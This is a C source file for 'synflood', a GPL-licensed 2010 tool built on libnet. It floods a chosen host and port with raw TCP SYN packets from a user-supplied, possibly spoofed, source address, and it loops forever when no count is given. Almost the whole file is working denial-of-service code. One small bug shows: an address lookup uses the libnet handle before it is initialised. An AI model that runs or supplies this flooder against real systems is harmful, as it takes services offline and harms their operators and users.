
/*
	Created @ 18.12.2010 by TheFox@fox21.at
	Version: 2.0.0
	Copyright (c) 2010 TheFox
	
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
	Developed and tested with libnet1.
	Under Debian Linux install libnet1-dev.
*/


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <libnet.h>

#define DEBUG
//#define SRC_PORT_RND
#define EXIT_ON_FAIL
#define TTL 255
#define USLEEP 250
#define ARGC_MIN 4



void usagePrint();

int main(int argc, char **argv){
	
	unsigned int connections = 0;
	unsigned int connectionsc;
	int i, sockWriteBytes;
	char *buf = NULL;
	char *errbuf = NULL;
	char *srcIpStr = NULL;
	char *dstIpStr = NULL;
	u_int32_t srcIp = 0;
	u_int32_t dstIp = 0;
	u_int16_t srcPort = 0;
	u_int16_t dstPort = 0;
	libnet_t *net;
	libnet_ptag_t ipv4 = 0, tcp = 0;
	
	printf("synflood " VERSION " (%s %s)\n", __DATE__, __TIME__);
	puts("Copyright (c) 2010 TheFox@fox21.at\n");
	if(argc < ARGC_MIN)
		usagePrint();
	
	if(getuid()){
		fprintf(stderr, "ERROR: You are not root, script kiddie.\n");
		exit(1);
	}
	
	srcIpStr = argv[1];
	dstIpStr = argv[2];
	dstPort = atoi(argv[3]);
	if(argc == 5)
		connections = atoi(argv[4]);
	
	errbuf = (char *)malloc(LIBNET_ERRBUF_SIZE);
	
	srcIp = libnet_name2addr4(net, srcIpStr, LIBNET_RESOLVE);
	if(srcIp == -1){
		fprintf(stderr, "ERROR: bad SRC ip address: %s\n", srcIpStr);
		exit(1);
	}
	
	dstIp = libnet_name2addr4(net, dstIpStr, LIBNET_RESOLVE);
	if(dstIp == -1){
		fprintf(stderr, "ERROR: bad DST ip address: %s\n", dstIpStr);
		exit(1);
	}
	
	
	net = libnet_init(LIBNET_RAW4, srcIpStr, errbuf);
	if(!net){
		fprintf(stderr, "ERROR: libnet_init: %s", libnet_geterror(net));
		exit(1);
	}
	libnet_seed_prand(net);
	
	printf("SRC %s\n", srcIpStr);
	printf("DST %s %d\n", dstIpStr, dstPort);
	printf("TTL %d\n", TTL);
	puts("\nstart");
	
	// connectionsc < connections
	for(connectionsc = 0; connectionsc < connections || !connections; connectionsc++){
		
#ifdef SRC_PORT_RND
		srcPort = libnet_get_prand(LIBNET_PRu16);
#else
		srcPort++;
		if(srcPort > 65535)
			srcPort = 1;
#endif
		
#ifdef DEBUG
		printf("send %6d SPT=%d\n", connectionsc, srcPort);
#endif
		
		tcp = libnet_build_tcp(
			srcPort, // src port
			dstPort, // dst port
			libnet_get_prand(LIBNET_PRu16), // seq
			0, // ack
			TH_SYN, // control
			65535, // window
			0, // checksum
			0, // urgent
			LIBNET_TCP_H, // header len
			NULL, // payload
			0, // payload size
			net,
			tcp
		);
		if(tcp == -1)
			fprintf(stderr, "ERROR: libnet_build_tcp: %s", libnet_geterror(net));
		
		ipv4 = libnet_build_ipv4(
			LIBNET_IPV4_H, // len
			0, // tos
			libnet_get_prand(LIBNET_PRu16), // ip id
			IP_DF, // frag
			TTL, // ttl
			IPPROTO_TCP, // upper layer protocol
			0, // checksum
			srcIp, // src ip
			dstIp, // dst ip
			NULL, // payload
			0, // payload size
			net,
			ipv4
		);
		if(ipv4 == -1)
			fprintf(stderr, "ERROR: libnet_build_ipv4: %s", libnet_geterror(net));
		
		sockWriteBytes = libnet_write(net);
		if(sockWriteBytes == -1){
			fprintf(stderr, "ERROR: libnet_write: %s", libnet_geterror(net));
#ifdef EXIT_ON_FAIL
			exit(1);
#endif
		}
		
		//libnet_destroy(net);
		usleep(USLEEP);
		
	}
	
	free(errbuf);
	
	puts("\nexit 0");
	return 0;
}

void usagePrint(){
	printf("Usage: ./synflood SRC DST DPT [CONNECTIONS]\n");
	exit(1);
}

// EOF
